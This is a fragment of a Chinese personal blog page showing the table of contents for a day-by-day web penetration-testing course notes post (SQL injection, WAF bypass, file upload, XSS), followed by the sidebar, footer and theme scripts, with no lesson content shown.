&#x3D;&#x3D;信息敏感点&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E8%B5%84%E6%BA%90-2"><span class="toc-number">5.3.</span> <span class="toc-text">资源资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%A4%A9%E2%80%93%E7%B3%BB%E7%BB%9F-amp-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.</span> <span class="toc-text">第五天–系统&amp;数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2"><span class="toc-number">6.1.</span> <span class="toc-text">5.1 操作系统层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2"><span class="toc-number">6.2.</span> <span class="toc-text">5.2 数据库层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E8%B5%84%E6%BA%90-3"><span class="toc-number">6.3.</span> <span class="toc-text">资源资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P6-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">P6. 加密算法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AD%89%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90"><span class="toc-number">7.1.</span> <span class="toc-text">6.1 常见加密编码等算法解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E5%BD%A2%E5%BC%8F%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90"><span class="toc-number">7.2.</span> <span class="toc-text">6.2 常见加密形式算法解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E5%B8%B8%E8%A7%81%E8%A7%A3%E5%AF%86%E6%96%B9%E5%BC%8F"><span class="toc-number">7.3.</span> <span class="toc-text">6.3 常见解密方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-4-%E4%BA%86%E8%A7%A3%E5%B8%B8%E8%A7%84%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E7%89%B9%E6%80%A7"><span class="toc-number">7.4.</span> <span class="toc-text">6.4 了解常规加密算法的特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-5-%E5%B7%A5%E5%85%B7"><span class="toc-number">7.5.</span> <span class="toc-text">6.5 工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E8%B5%84%E6%BA%90-4"><span class="toc-number">7.6.</span> <span class="toc-text">资源资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P7-DNS-%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">P7. DNS 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89CDN"><span class="toc-number">8.1.</span> <span class="toc-text">7.1 判断是否有CDN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-CDN%E5%AF%B9%E6%B5%8B%E8%AF%95%E6%9C%89%E4%BD%95%E5%BD%B1%E5%93%8D-amp-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">8.2.</span> <span class="toc-text">7.2 CDN对测试有何影响&amp;如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-%E6%B5%8B%E8%AF%95"><span class="toc-number">8.3.</span> <span class="toc-text">7.3 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90"><span class="toc-number">8.4.</span> <span class="toc-text">资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P8-%E6%9E%B6%E6%9E%84%E3%80%81%E6%90%AD%E5%BB%BA%E3%80%81waf"><span class="toc-number">9.</span> <span class="toc-text">P8. 架构、搭建、waf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA%E5%88%86%E6%9E%90"><span class="toc-number">9.1.</span> <span class="toc-text">8.1 站点搭建分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-WAF%E9%98%B2%E6%8A%A4%E5%88%86%E6%9E%90"><span class="toc-number">9.2.</span> <span class="toc-text">8.2 WAF防护分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90-1"><span class="toc-number">9.3.</span> <span class="toc-text">资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P9-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7"><span class="toc-number">10.</span> <span class="toc-text">P9. APP及其他资产</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9-1-APE%E6%8F%90%E5%8F%96%E4%B8%80%E9%94%AE%E5%8F%8D%E7%BC%96%E8%AF%91%E6%8F%90%E5%8F%96"><span class="toc-number">10.1.</span> <span class="toc-text">9.1 APE提取一键反编译提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-2-APP%E6%8A%93%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BF%9B%E8%A1%8C%E5%B7%A5%E5%85%B7%E9%85%8D%E5%90%88"><span class="toc-number">10.2.</span> <span class="toc-text">9.2 APP抓数据包进行工具配合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3-%E5%90%84%E7%A7%8D%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E7%9B%B8%E5%85%B3%E6%8E%A2%E9%92%88%E6%8A%80%E6%9C%AF"><span class="toc-number">10.3.</span> <span class="toc-text">9.3 各种第三方应用相关探针技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-4-%E5%90%84%E7%A7%8D%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E7%9B%B8%E5%85%B3%E6%8E%A2%E9%92%88%E6%8A%80%E6%9C%AF"><span class="toc-number">10.4.</span> <span class="toc-text">9.4 各种服务接口信息相关探针技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B0%E5%BD%95"><span class="toc-number">10.5.</span> <span class="toc-text">记录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P10-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95"><span class="toc-number">11.</span> <span class="toc-text">P10. 资产监控拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90-2"><span class="toc-number">11.1.</span> <span class="toc-text">资源</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC11%E5%A4%A9%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">12.</span> <span class="toc-text">第11天：漏洞必懂知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql"><span class="toc-number">12.1.</span> <span class="toc-text">sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E7%9A%84%E9%9D%B6%E5%9C%BA"><span class="toc-number">12.2.</span> <span class="toc-text">目录遍历的靶场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E2%80%94%E6%BA%90%E7%A0%81%E5%86%85%E5%AE%B9%E8%8E%B7%E5%8F%96%E5%8D%B1%E5%AE%B3"><span class="toc-number">12.3.</span> <span class="toc-text">文件读取漏洞—源码内容获取危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E2%80%94WEB%E6%9D%83%E9%99%90%E4%B8%A2%E5%A4%B1%E5%8D%B1%E5%AE%B3"><span class="toc-number">12.4.</span> <span class="toc-text">文件上传漏洞—WEB权限丢失危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC12%E5%A4%A9%EF%BC%9AWEB%E6%BC%8F%E6%B4%9E%E2%80%94SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">第12天：WEB漏洞—SQL注入之简要SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%8D%B1%E5%AE%B3"><span class="toc-number">13.1.</span> <span class="toc-text">SQL注入安全测试中危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">13.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83sqlilabs"><span class="toc-number">13.3.</span> <span class="toc-text">靶场环境sqlilabs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E7%89%87"><span class="toc-number">13.4.</span> <span class="toc-text">正片</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E5%A4%A9"><span class="toc-number">14.</span> <span class="toc-text">第十三天</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E8%A7%A3"><span class="toc-number">14.1.</span> <span class="toc-text">图解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-number">14.2.</span> <span class="toc-text">权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C"><span class="toc-number">14.3.</span> <span class="toc-text">文件读写操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">14.4.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%A4%A9%EF%BC%9AWEB%E6%BC%8F%E6%B4%9E%E2%80%94SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">第十四天：WEB漏洞—SQL注入之类型及提交注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E6%98%8E%E7%A1%AE%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B"><span class="toc-number">15.1.</span> <span class="toc-text">简要明确参数类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E6%98%8E%E7%A1%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95"><span class="toc-number">15.2.</span> <span class="toc-text">简要明确请求方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B-1"><span class="toc-number">15.3.</span> <span class="toc-text">演示案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%94%E5%A4%A9%EF%BC%9AWEB%E6%BC%8F%E6%B4%9E%E2%80%94SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle-MongoDB%E7%AD%89%E6%B3%A8%E5%85%A5"><span class="toc-number">16.</span> <span class="toc-text">第十五天：WEB漏洞—SQL注入之Oracle,MongoDB等注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2Mssql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">16.1.</span> <span class="toc-text">查询Mssql手工注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-Sqlmap%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-x3D-x3D"><span class="toc-number">16.2.</span> <span class="toc-text">&#x3D;&#x3D;Sqlmap基本操作&#x3D;&#x3D;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%AD%E5%A4%A9%EF%BC%9AWEB%E6%BC%8F%E6%B4%9E%E2%80%94SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="toc-number">17.</span> <span class="toc-text">第十六天：WEB漏洞—SQL注入之查询方式及报错盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B-2"><span class="toc-number">17.1.</span> <span class="toc-text">演示案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC17%E5%A4%A9%EF%BC%9AWEB%E6%BC%8F%E6%B4%9E%E2%80%94SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1-%E5%8A%A0%E8%A7%A3%E5%AF%86-DNS%E7%AD%89%E6%B3%A8%E5%85%A5"><span class="toc-number">18.</span> <span class="toc-text">第17天：WEB漏洞—SQL注入之二次,加解密,DNS等注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC18%E5%A4%A9%EF%BC%9AWEB%E6%BC%8F%E6%B4%9E%E2%80%94SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E5%8F%8AWAF%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5"><span class="toc-number">19.</span> <span class="toc-text">第18天：WEB漏洞—SQL注入之堆叠及WAF绕过注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B-3"><span class="toc-number">19.1.</span> <span class="toc-text">演示案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC19%E5%A4%A9%EF%BC%9AWEB%E6%BC%8F%E6%B4%9E%E2%80%94SQL%E6%B3%A8%E5%85%A5%E4%B9%8BSQLMAP%E7%BB%95%E8%BF%87WAF"><span class="toc-number">20.</span> <span class="toc-text">第19天：WEB漏洞—SQL注入之SQLMAP绕过WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B-4"><span class="toc-number">20.1.</span> <span class="toc-text">演示案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC20%E5%A4%A9%EF%BC%9AWEB-%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%87%E6%BB%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">21.</span> <span class="toc-text">第20天：WEB 漏洞-文件上传之基础及过滤方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC21%E5%A4%A9%EF%BC%9AWEB-%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">22.</span> <span class="toc-text">第21天：WEB 漏洞-文件上传之后端黑白名单绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC25%E5%A4%A9%EF%BC%9AWEB-%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-number">23.</span> <span class="toc-text">第25天：WEB 漏洞-XSS跨站之原理分类及攻击手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC26%E5%A4%A9%EF%BC%9AWEB-%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8Ashell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0"><span class="toc-number">24.</span> <span class="toc-text">第26天：WEB 漏洞-XSS跨站之订单及shell箱子反杀记</span></a></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="Kobe_"
      data-src="https://avatars.githubusercontent.com/u/116647725?s=400&u=c1d12fb27b36682d1ce63e666ba3ed2684c6cc3c&v=4"
  >
  <p class="name" itemprop="name">Kobe_</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">8</span>
        <span class="name">文章</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL0tvYmUtdGltZQ==" title="https:&#x2F;&#x2F;github.com&#x2F;Kobe-time"><i class="ic i-github"></i></span>
      <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE4NzU2OTk4NTQ=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1875699854"><i class="ic i-cloud-music"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOjI5MDc0MTAyNjlAcXEuY29t" title="mailto:2907410269@qq.com"><i class="ic i-envelope"></i></span>
      <span class="exturl item qq" data-url="aHR0cHM6Ly9xbS5xcS5jb20vY2dpLWJpbi9xbS9xcj9rPTRGQVJ0ZzhfQmJXeHNKSUhxUlZGVWtpT2lfbVprS0VTJm5vdmVyaWZ5PTAmcGVyc29uYWxfcXJjb2RlX3NvdXJjZT0z" title="https:&#x2F;&#x2F;qm.qq.com&#x2F;cgi-bin&#x2F;qm&#x2F;qr?k&#x3D;4FARtg8_BbWxsJIHqRVFUkiOi_mZkKES&amp;noverify&#x3D;0&amp;personal_qrcode_source&#x3D;3"><i class="ic i-qq"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-link"></i>友链</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2023/05/09/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/06/04/PHP/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/08/02/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" title="语言学习">语言学习</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/04/05/chatGPT%E6%8C%87%E4%BB%A4%E5%A4%A7%E5%85%A8/" title="chatGPT角色扮演">chatGPT角色扮演</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/07/13/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E4%BA%A7%E4%B8%9A%E6%95%99%E8%82%B2%E4%B8%AD%E5%BF%83/" title="深信服产业培训中心">深信服产业培训中心</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/06/04/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B7%AF%E7%BA%BF/" title="网络安全路线">网络安全路线</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/06/01/%E5%B0%8F%E8%BF%AA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="小迪网络安全">小迪网络安全</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/06/04/PHP/" title="php">php</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/03/13/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" title="工具使用">工具使用</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/05/09/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="靶场练习">靶场练习</a></span>
  </li>

  </ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Kobe_ @ hello world</span>
  </div>
<div class="timing">
  <span id="RunTime"></span>
  <script>
    var BootDate = new Date("2021/10/24 23:00:00"); 
    function ShowRunTime(id) {
      var NowDate = new Date();
      var RunDateM = parseInt(NowDate - BootDate);
      var RunDays = Math.floor(RunDateM/(24*3600*1000));
      var RunHours = Math.floor(RunDateM%(24*3600*1000)/(3600*1000));
      var RunMinutes = Math.floor(RunDateM%(24*3600*1000)%(3600*1000)/(60*1000));
      var RunSeconds = Math.round(RunDateM%(24*3600*1000)%(3600*1000)%(60*1000)/1000);
      var RunTime = RunDays + " 天 " + RunHours + " 时 " + RunMinutes + " 分 " + RunSeconds + " 秒";
      document.getElementById(id).innerHTML = "本站已运行 " + RunTime;
    }
    setInterval("ShowRunTime('RunTime')", 1000);
  </script>
</div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2023/06/01/小迪网络安全/',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
